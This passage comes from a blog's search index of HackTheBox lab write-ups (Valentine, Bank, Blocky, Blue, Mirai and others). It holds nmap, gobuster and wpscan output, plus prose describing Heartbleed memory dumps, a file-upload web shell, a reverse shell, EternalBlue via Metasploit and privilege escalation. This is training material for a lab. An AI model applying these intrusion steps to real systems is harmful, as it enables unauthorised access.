it\u0026rsquo;s vulnerable Let\u0026rsquo;s remove zeros from output Now we need to dump the memory Found a script You can modify the length within the exploit, in case you want to play with it Let\u0026rsquo;s launch the script We might have to launch it few times And we get some results You can use the decoder from the decode endpoint on the webserver or base64 tool Let\u0026rsquo;s also check the key file from the dev endpoint Download it and use xxd tool to reverse the hexdump Okay, it looks like it\u0026rsquo;s a rsa key, we can use to connect via ssh Root Let\u0026rsquo;s enumerate for privesc Upload linpeas Scan the results We see that we can try dirty cow exploit, since it\u0026rsquo;s an old box The list of processes indicate opened session in tmux We can try tmux session hijacking So let\u0026rsquo;s escalate privileges And get a root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/valentine/images/valentine.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/valentine/","summary":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Valentine"},{"categories":null,"contents":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.01 seconds dig ┌──(kali㉿kali)-[~] └─$ dig AXFR bank.htb @10.10.10.29 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; AXFR bank.htb @10.10.10.29 ;; global options: +cmd bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 bank.htb. 604800 IN NS ns.bank.htb. bank.htb. 604800 IN A 10.10.10.29 ns.bank.htb. 604800 IN A 10.10.10.29 www.bank.htb. 604800 IN CNAME bank.htb. bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 ;; Query time: 231 msec ;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP) ;; WHEN: Tue Jun 06 16:43:22 BST 2023 ;; XFR size: 6 records (messages 1, bytes 171) After adding records to /etc/hosts └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:46:01 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 200) [Size: 1974] /index.php (Status: 302) [Size: 7322] [--\u0026gt; login.php] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.htaccess (Status: 403) [Size: 284] /. (Status: 302) [Size: 7322] [--\u0026gt; login.php] /.html (Status: 403) [Size: 280] /support.php (Status: 302) [Size: 3291] [--\u0026gt; login.php] /.php (Status: 403) [Size: 279] /.htpasswd (Status: 403) [Size: 284] /.htm (Status: 403) [Size: 279] /.htpasswds (Status: 403) [Size: 285] /.htgroup (Status: 403) [Size: 283] /wp-forum.phps (Status: 403) [Size: 288] /.htaccess.bak (Status: 403) [Size: 288] /.htuser (Status: 403) [Size: 282] /.ht (Status: 403) [Size: 278] /.htc (Status: 403) [Size: 279] /dispatch.fcgi (Status: 403) [Size: 288] /mytias.fcgi (Status: 403) [Size: 286] /test.fcgi (Status: 403) [Size: 284] Progress: 16243 / 16245 (99.99%) └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:49:19 Starting gobuster in directory enumeration mode =============================================================== /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /server-status (Status: 403) [Size: 288] gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 17:16:22 Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /server-status (Status: 403) [Size: 288] /balance-transfer (Status: 301) [Size: 314] [--\u0026gt; http://bank.htb/balance-transfer/] Progress: 220431 / 220561 (99.94%) Web server Let\u0026rsquo;s check inc edpoint from gobuster results Let\u0026rsquo;s launch Burp Suite We see strange response when accessing / path We recieve a big redirect response Foothold/User Let\u0026rsquo;s check balance-transfer endpoint We see bunch of transaction files Let\u0026rsquo;s curl and parse the results We see that majority of files have almost identical sizes except one Let\u0026rsquo;s check it We have credentials Use them to login to web server While checking the server, we notice that there is a support page with upload ticket option Let\u0026rsquo;s try file upload attack Check the request in Burp Suite I was trying manipulating Content-Type, adding magic byte, changing file extensions Then I noticed the comment Change extension to htb We were able to upload the file and now we have web-shell Let\u0026rsquo;s launch reverse-shell Root Basic privilege escalation routine Check sudo rights Check suid files etc. or use linpeas like tools We notice strange file named emergency Launch it Boom, we rooted the box Different approach There is a different approach to gain a foothold We saw that we receive a full page, but with response headers 301 or 302 status codes We can set Burp Suite proxy settings to Match and Replace those codes to 200 OK And we will simply open the page without any redirection ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bank/images/bank.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bank/","summary":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB"],"title":"[HTB] Machine: Bank"},{"categories":null,"contents":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://blocky.htb 8192/tcp closed sophos Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds Start gobuster └─$ gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://blocky.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 18:34:46 Starting gobuster in directory enumeration mode =============================================================== /wiki (Status: 301) [Size: 307] [--\u0026gt; http://blocky.htb/wiki/] /wp-content (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/wp-content/] /plugins (Status: 301) [Size: 310] [--\u0026gt; http://blocky.htb/plugins/] /wp-includes (Status: 301) [Size: 314] [--\u0026gt; http://blocky.htb/wp-includes/] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/javascript/] /wp-admin (Status: 301) [Size: 311] [--\u0026gt; http://blocky.htb/wp-admin/] /phpmyadmin (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/phpmyadmin/] /server-status (Status: 403) [Size: 298] Progress: 220560 / 220561 (100.00%) We see wp-admin, so launch wpscan and enumerate Wordpress └─$ wpscan -e --url http://blocky.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://blocky.htb/ [10.10.10.37] [+] Started: Tue Jun 6 18:43:45 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blocky.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://blocky.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; | - http://blocky.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://blocky.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:22 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:22 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:44 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:44 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:04 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:04 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue Jun 6 18:46:16 2023 [+] Requests Done: 3436 [+] Cached Requests: 10 [+] Data Sent: 922.433 KB [+] Data Received: 1.008 MB [+] Memory used: 285.152 MB [+] Elapsed time: 00:02:30 Check phpmyadmin endpoint Foothold/User Check plugins endpoint We see 2 files Download them They have jar extension Upload them jd-gui We retrieve password Try with a notch user that we enumerated with wpscan Success Root Check sudo rights Full sudo access ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blocky/images/blocky.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blocky/","summary":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Blocky"},{"categories":null,"contents":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-06T20:33:23+01:00 |_clock-skew: mean: -20m25s, deviation: 34m35s, median: -27s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.84 seconds nmap scripts └─$ nmap -Pn -p135,139,445 --script *vuln* 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:37 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.22s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds Right away we see that the box is vulnerable to ms17-010 Foothold/User/Root Launch metasploit Search for ms17_010 Set options And launch the attack Wait for exploit to finish Grab your flags ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/blue/images/blue.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/blue/","summary":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.","tags":["HTB"],"title":"[HTB] Machine: Blue"},{"categories":null,"contents":"Jupiter Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jupiter/images/jupiter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jupiter/","summary":"Jupiter Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.","tags":["HTB"],"title":"[HTB] Machine: Jupiter"},{"categories":null,"contents":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.94 seconds nmap └─$ nmap -Pn -p22,53,80,1331,32400,32469 -sC -sV 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:46 BST Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aaef5ce08e86978247ff4ae5401890c5 (DSA) | 2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA) | 256 b6a07838d0c810948b44b2eaa017422b (ECDSA) |_ 256 4d6840f720c4e552807a4438b8a2a752 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 1331/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd |_http-favicon: Plex |_http-title: Unauthorized |_http-cors: HEAD GET POST PUT DELETE OPTIONS | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds Check web server Nothing to see Launch gobuster Check admin and versions endpoints Check port 32400 Foothold/User We saw in admin endpoint, that it\u0026rsquo;s a Pi-hole It\u0026rsquo;s a DNS sinkhole that is designed to run on Raspberry Pi So let\u0026rsquo;s try default credentials to get an access We\u0026rsquo;re in Root Check sudo rights sudo user Retrieve the flag Oops, we have a note instead It says to check a usb stick Let\u0026rsquo;s check mounted devices We see /dev/sdb mounted at /media/usbstick, where have another note which indicates that the flag was accidentally deleted You can also use mount to see mounted devices I googled to find a way to retrieve a flag Since in linux everything is a file, maybe we can read the contents of the /dev/sdb The files in any OS usually don\u0026rsquo;t get deleted from device, since it\u0026rsquo;s costly to zero every block on the disk When the file gets deleted, the metadata of the blocks (headers etc) that held the data will be changed from used to free The data will be present, until it is overwritten So let\u0026rsquo;s grep the flag ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/mirai/images/mirai.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mirai/","summary":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.","tags":["HTB"],"title":"[HTB] Machine: Mirai"},{"categories":null,"contents":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.2.3 |_http-title: Did not follow redirect to https://10.10.10.7/ |_http-server-header: Apache/2.2.3 (CentOS) 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: TOP LOGIN-DELAY(0) EXPIRE(NEVER) RESP-CODES STLS PIPELINING APOP IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE UIDL 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: ID STARTTLS BINARY MULTIAPPEND Completed IDLE OK QUOTA URLAUTHA0001 X-NETSCAPE THREAD=REFERENCES NO LITERAL+ CHILDREN LISTEXT CONDSTORE ATOMIC CATENATE MAILBOX-REFERRALS RENAME SORT=MODSEQ THREAD=ORDEREDSUBJECT IMAP4rev1 LIST-SUBSCRIBED UNSELECT ACL SORT 